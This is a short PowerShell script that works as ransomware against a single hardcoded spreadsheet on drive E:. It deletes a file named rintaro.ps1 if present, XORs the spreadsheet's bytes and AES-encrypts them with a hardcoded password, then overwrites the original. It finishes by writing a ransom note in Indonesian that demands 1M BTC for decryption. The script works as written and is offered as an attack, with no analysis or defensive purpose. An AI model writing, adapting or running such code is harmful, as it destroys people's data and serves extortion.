$target = "E:\myyyykiisaahhhhh\Pembekalan LKS.xlsx"
$key = "Di_antara_Kita_9861gvds1"

if (Test-Path "rintaro.ps1") { 
    Remove-Item "rintaro.ps1" -Force
}

function XOR-Bytes {
    param([byte[]]$data, [byte]$k)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor $k
    }
    return $data
}

function AES-Encrypt {
    param([byte[]]$data, [string]$pass)
    
    $salt = New-Object byte[] 16
    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($salt)
    
    $derive = New-Object Security.Cryptography.Rfc2898DeriveBytes([Text.Encoding]::UTF8.GetBytes($pass), $salt, 10000)
    $aesKey = $derive.GetBytes(32)
    $aesIV = $derive.GetBytes(16)
    
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.Key = $aesKey
    $aes.IV = $aesIV
    $aes.Mode = [Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    
    $enc = $aes.CreateEncryptor()
    $result = $enc.TransformFinalBlock($data, 0, $data.Length)
    
    return $salt + $result
}

if (Test-Path $target) {
    try {
        $bytes = [IO.File]::ReadAllBytes($target)
        
        $xored = XOR-Bytes -data $bytes -k 0x7D
        
        $encrypted = AES-Encrypt -data $xored -pass $key
        
        [IO.File]::WriteAllBytes($target, $encrypted)
        
        Write-Host "Done. File encrypted (overwritten): $target"
        Write-Host "Key: $key | XOR: 0x7D"
        
        @"
HEHEH KAMU BAYAR 1M BTC BARU KU DECRIPT
"@ | Out-File "E:\myyyykiisaahhhhh\readme.txt"
        
    } catch {
        Write-Host "Error: $_"
    }
} else {
    Write-Host "File ga ketemu: $target"
}
